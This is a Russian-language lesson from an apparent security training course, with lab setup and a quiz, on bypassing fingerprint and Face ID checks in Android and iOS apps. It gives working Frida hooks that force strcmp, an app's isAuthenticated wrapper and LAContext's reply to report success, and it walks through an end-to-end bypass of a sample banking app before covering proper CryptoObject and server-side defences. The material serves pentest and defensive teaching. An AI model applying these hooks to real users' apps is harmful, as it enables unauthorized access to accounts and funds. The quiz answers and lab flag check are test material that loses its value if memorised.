---
id: mobile-biometric
title: "Биометрия: обход fingerprint/face-аутентификации"
category: mobile
parent: mobile-sidechannels
difficulty: medium
order: 2
tags: [biometric, fingerprint, faceid, biometricprompt, bypass, frida, android, ios]
prerequisites: [mobile-insecure-storage, mobile-dynamic-frida]
useful_for:
  - "CTF Mobile (обход биометрии)"
  - "Bug bounty (логические обходы аутентификации)"
  - "Пентест мобильных приложений"
estimated_minutes: 30
summary: "Как приложения используют биометрию (BiometricPrompt, LocalAuthentication) и как обходить проверку через Frida-хуки; почему клиентская биометрия — не замена серверной аутентификации."
lab:
  kind: shell
  title: 'Практика: обход биометрии'
  toolset: [core, grep]
  workdir: /home/student/task
  files: [task.md, decoded]
  check: 'grep -q ''nto{'' found.txt'
  hints:
    - '`BiometricPrompt.authenticate` принимает `AuthenticationCallback`.'
    - 'Если `onAuthenticationFailed` не блокирует, а `onAuthenticationSucceeded` логирует секрет — утечка.'
    - 'Найди `nto{` в обработчике биометрии и запиши в `found.txt`.'
---

## Вопрос, с которого всё начинается

Мобильное приложение просит отпечаток пальца или Face ID, и после успеха открывает доступ к деньгам или приватным данным. Возникает вопрос: а что если «успех» — это просто `true`, который вернул системный API? Можно ли его подделать?

В этом уроке мы разберём, где именно принимается решение о биометрии, и научимся подменять его. И покажем это вживую на маленькой программе-модели.

## Наш пример: проверка «свой/чужой» в коде

Биометрия — это, по сути, булева проверка: «совпало или нет». Чтобы понять, как её обойти, возьмём нашу лабораторную программу `crackme` (мы собирали её в уроке про Frida). Она сравнивает введённый пароль с секретом через `strcmp`:

```c
if (strcmp(candidate, SECRET) == 0) {
    printf("Success! Correct secret.\n");
} else {
    printf("Nope, try again.\n");
}
```

Запустим её с неправильным паролем — контрольный прогон:

```
$ ./crackme totally-wrong
Nope, try again.
```

Проверка «не прошла». Теперь то же самое, но с хуком Frida, который подменяет результат `strcmp` на «совпало»:

```javascript
const f = Module.getGlobalExportByName("strcmp");
Interceptor.attach(f, {
  onLeave(retval) {
    console.log("[*] original strcmp result = " + retval.toInt32());
    retval.replace(0);            // force "equal"
  }
});
```

Запускаем и смотрим вывод:

```
$ python3 force_ok.py
Success! Correct secret.
[*] original strcmp result = 61
[+] forced strcmp result = 0 (match)
```

Пароль всё ещё неправильный (`totally-wrong`), но программа уверена, что он совпал. **Вот и вся суть обхода клиентской проверки**: если решение принимается в приложении, его результат можно подменить.

## Шаг 1: как биометрия выглядит в коде

Современный Android использует `BiometricPrompt` — системный диалог, который показывает отпечаток/лицо и возвращает приложению результат через колбэк:

```java
BiometricPrompt prompt = new BiometricPrompt(activity, executor,
    new BiometricPrompt.AuthenticationCallback() {
        public void onAuthenticationSucceeded(AuthenticationResult r) {
            unlockVault();   // критичное действие — здесь
        }
    });
prompt.authenticate(new BiometricPrompt.PromptInfo.Builder()
    .setTitle("Вход").build());
```

На iOS аналог — `LAContext`:

```swift
let ctx = LAContext()
if ctx.canEvaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, error: &err) {
    ctx.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics,
        localizedReason: "Вход") { ok, _ in
        if ok { self.unlockVault() }
    }
}
```

В обоих случаях приложение получает булево (`onAuthenticationSucceeded` или `ok`) и само решает, что делать. Это и есть слабое место — как `strcmp` в нашей модели.

## Шаг 2: обход на Android

Первый подход — хукать системный колбэк. Но на практике проще искать **собственную обёртку** приложения: разработчики часто заворачивают биометрию в свой метод вроде `isBiometricValid()` или `checkFingerprint()`. Ищем её в декомпилированном коде:

```
$ grep -rn "BiometricPrompt\|FingerprintManager\|isAuthenticated\|biometric" jadx_out/ | head
com/target/security/BiometricHelper.java:  public boolean isAuthenticated() { ... }
```

И возвращаем `true`:

```javascript
Java.perform(function () {
  var H = Java.use('com.target.security.BiometricHelper');
  H.isAuthenticated.implementation = function () {
    console.log('[+] biometric bypassed');
    return true;
  };
});
```

Подключаемся: `frida -U -f com.target.app -l bypass.js`. Переходим на защищённый экран — доступ получен без отпечатка.

## Шаг 3: обход на iOS

На iOS подменяем reply-блок `evaluatePolicy`, чтобы он всегда сообщал успех:

```javascript
var LA = ObjC.classes.LAContext;
Interceptor.attach(LA['- evaluatePolicy:localizedReason:reply:'].implementation, {
  onEnter: function (args) {
    var reply = new ObjC.Block(args[4]);
    reply.implementation = function (success, error) { reply(true, NULL); };
  }
});
```

Objection делает то же одной командой: `ios ui biometrics_bypass`.

## Шаг 4: главный вопрос — где настоящая проверка

Обход локального булева — это ещё не победа. Надо понять, **что защищает биометрия** в конкретном приложении:

- **Только локальный экран.** Биометрия открывает раздел, а данные приходят по уже валидному токену. Обход даёт доступ к разделу — High, если там деньги/данные.
- **Разблокировка ключа.** Биометрия разблокирует ключ в Keystore/Secure Enclave, которым подписывается операция. Без ключа подделать нельзя — это правильная модель.
- **Step-up на сервере.** Сервер требует свежую подпись/attestation. Локальный флаг не поможет.

Проверьте, не уходит ли на сервер голое `biometric=true` без доказательства. Если уходит — находка.

## Шаг 5: флаг состояния в хранилище

Частая ошибка — хранить результат биометрии в `SharedPreferences` или памяти:

```java
prefs.edit().putBoolean("bio_ok", true).apply();
```

Проверяем, даёт ли выставленный вручную флаг доступ (на debuggable/root):

```
$ adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/state.xml
<boolean name="bio_ok" value="true" />
```

Если `bio_ok=true` открывает доступ — модель сломана. Ещё проверьте, какой policy используется: `deviceOwnerAuthentication` (биометрия ИЛИ PIN) вместо `...WithBiometrics` принимает PIN — это fallback, но иногда приложение считает, что «биометрия прошла», хотя ввели PIN.

## Полный прогон от начала до конца

Соберём обход в один сценарий для банковского приложения `SecureBank`:

1. **`jadx`** — декомпилируем и ищем `Biometric`/`isAuthenticated`.
2. **Находим обёртку** — например, `SecureBankSecurity.isFingerprintValid()`.
3. **Запускаем под Frida** с хуком, возвращающим `true`.
4. **Открываем экран «Мои карты»** — он больше не спрашивает отпечаток.
5. **Проверяем действие** — например, перевод. Уходит ли на сервер подпись или обычный токен?
6. **Фиксируем доказательство** — скриншот доступа, лог хука, отсутствие серверной перепроверки.

Ключевой момент — шаг 5. Если сервер принял операцию по существующему токену, обход даёт реальный доступ и severity высокий. Если сервер потребовал свежую криптоподпись и отказал — обход лишь показал слабость локальной модели, но деньги не ушли.

## Если не сработало

- **`canAuthenticate`/`canEvaluatePolicy` возвращает `false` на эмуляторе.** Это не уязвимость, а отсутствие биометрии в среде. Тестируйте на реальном устройстве или эмуляторе с настроенным отпечатком.
- **Ключ привязан к аутентификации.** Если `CryptoObject` построен на ключе с `setUserAuthenticationRequired(true)`, подмена колбэка не даст подписать операцию. Тогда ищите обход на root (разблокировать ключ) или другой вектор.
- **Сервер перепроверяет.** Если после локального «успеха» сервер требует подпись и отклоняет запрос — задокументируйте это как правильную модель и переходите дальше.
- **Обёртки нет.** Приложение вызывает системный API напрямую — хукайте `AuthenticationCallback.onAuthenticationSucceeded`, но помните: успех колбэка ещё не значит, что критичное действие выполнено.
- **Fallback на PIN.** `deviceOwnerAuthentication` принимает PIN. Если приложение считает, что «прошла биометрия», хотя ввели PIN, — это логическая неточность, но не полный обход.

## Что мы теперь знаем

По-простому:

1. Биометрия в приложении — это булева проверка, результат которой возвращается в клиент.
2. Клиентскую проверку можно подменить хуком — как `strcmp` в нашей модели.
3. Проще хукать собственную обёртку приложения (`isAuthenticated`), чем системный API.
4. Обход опасен, только если критичное действие не защищено сервером или ключом Keystore.
5. Правильная защита — `setUserAuthenticationRequired(true)` и `CryptoObject`, а не голый флаг.

## Как это защищать

Правильная модель строится на трёх правилах:

- **Привязывать ключ к аутентификации.** `setUserAuthenticationRequired(true)` на Android и `kSecAccessControlBiometryAny` на iOS не дадут использовать ключ без биометрии.
- **Не доверять клиенту.** Сервер должен проверять подпись или attestation, а не принимать голое `biometric=true`.
- **Не хранить флаг в открытом виде.** Сбрасывайте `bio_ok` при сворачивании приложения и не кладите его в незащищённые SharedPreferences.

Если хотя бы одного правила нет — биометрия превращается в декорацию, которую снимает пара строк Frida.

## На что смотреть дальше

- **Ищите обёртку** биометрии в декомпилированном коде — это самая надёжная точка хука.
- **Проверяйте серверную перепроверку:** уходит ли подпись или просто токен.
- **Смотрите на policy:** `WithBiometrics` vs `deviceOwnerAuthentication`.
- **Проверяйте хранилище флага:** `bio_ok` в SharedPreferences — красный флаг.

## CryptoObject: как выглядит правильная привязка

Ключевая разница между «декоративной» и настоящей биометрией — в том, что защищает операцию. Правильный Android-паттерн привязывает биометрию к криптографическому ключу: пока пользователь не подтвердил личность, ключ физически недоступен для подписи.

Создаём ключ с требованием аутентификации:

```java
KeyGenParameterSpec spec = new KeyGenParameterSpec.Builder(
        "bio_key", KeyProperties.PURPOSE_SIGN)
    .setUserAuthenticationRequired(true)
    .setUserAuthenticationParameters(0, KeyProperties.AUTH_BIOMETRIC_STRONG)
    .setInvalidatedByBiometricEnrollment(true)   // сброс при новом отпечатке
    .build();
```

Затем этот ключ передаётся в `BiometricPrompt` как `CryptoObject`:

```java
Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
cipher.init(Cipher.ENCRYPT_MODE, publicKey);
prompt.authenticate(promptInfo, new BiometricPrompt.CryptoObject(cipher));
```

Теперь подмена `onAuthenticationSucceeded` хуком ничего не даст: без реальной биометрии `Cipher` не инициализируется и `doFinal` бросит `UserNotAuthenticatedException`. Именно это и проверяет пентестер — использует ли приложение `CryptoObject` или голый булев флаг.

На iOS аналог — `kSecAccessControlBiometryCurrentSet`:

```swift
let access = SecAccessControlCreateWithFlags(nil,
    kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
    .biometryCurrentSet, nil)
```

`.biometryCurrentSet` сбрасывает ключ при изменении набора отпечатков — важная деталь, которой часто пренебрегают.

| Проверка | Слабо | Правильно |
|----------|-------|-----------|
| Что защищает операцию | булев флаг в коде | ключ Keystore/Keychain |
| `setUserAuthenticationRequired` | не задан | `true` |
| Инвалидация при новом отпечатке | нет | `setInvalidatedByBiometricEnrollment(true)` |
| Серверная проверка | голый `biometric=true` | подпись/attestation |

Если приложение хранит только флаг — обход реален. Если используется `CryptoObject` и серверная перепроверка — локальный хук покажет слабость модели, но не даст доступа к критичному действию.

## Квиз

Проверь себя.

```quiz
- question: "Почему клиентскую биометрию можно обойти?"
  options:
    - "Решение принимается в приложении по булеву результату API"
    - "Она всегда серверная"
    - "Она использует TLS"
    - "Она хранится в Keychain"
  answer: 0
- question: "Какой Android API используется для биометрии?"
  options:
    - "BiometricPrompt"
    - "KeyguardManager только"
    - "AccountManager"
    - "TelephonyManager"
  answer: 0
- question: "Какой iOS-класс отвечает за локальную аутентификацию?"
  options:
    - "LAContext"
    - "UIApplication"
    - "NSURLSession"
    - "WKWebView"
  answer: 0
- question: "Что делает обход биометрии действительно опасным?"
  options:
    - "Критичное действие защищено только клиентским флагом"
    - "Приложение использует HTTPS"
    - "Устройство новое"
    - "Биометрия включена в настройках"
  answer: 0
- question: "Какой флаг Keystore делает ключ недоступным без аутентификации пользователя?"
  options:
    - "setUserAuthenticationRequired(true)"
    - "setRandomizedEncryptionRequired"
    - "setKeySize"
    - "setBlockMode"
  answer: 0
```

## Куда дальше

Мы научились обходить локальные проверки — биометрию и подобные булевы решения. В следующем уроке разберём **клонирование приложений**: как создаются «двойники» (dual apps, parallel space) и почему это открывает новые каналы атаки. А пока запомни главное: подменяемо то, что решается в клиенте; ищите обёртку и проверяйте, доверяет ли ей сервер.

## Где пригодится

- **CTF Mobile:** задачи, где биометрия — единственная преграда к флагу.
- **Bug bounty:** обход биометрии с доступом к деньгам/данным — high/critical.
- **Пентест:** проверка моделей аутентификации в банковских и крипто-приложениях.
- **Работа:** ревью архитектуры аутентификации (клиент vs сервер).
